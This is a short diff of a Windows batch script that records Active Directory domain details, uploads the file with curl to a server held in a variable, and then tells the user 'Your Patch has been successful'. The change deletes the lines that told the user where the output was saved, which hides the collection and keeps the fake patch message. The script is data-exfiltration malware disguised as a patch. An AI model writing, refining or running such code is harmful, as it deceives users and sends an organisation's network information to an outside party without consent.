@@ -37,14 +37,10 @@ echo === DOMAIN INFO === >> "%OUTPUT%"
 echo Domain: %USERDNSDOMAIN% >> "%OUTPUT%"
 echo Logon Server: %LOGONSERVER% >> "%OUTPUT%"
 
-echo.
-echo Done. Output saved to:
-echo %OUTPUT%
-
 REM Upload
 curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%
 
 
-echo "Your Patch has been successful"
+echo "Your Patch has been successfull"
 
 pause
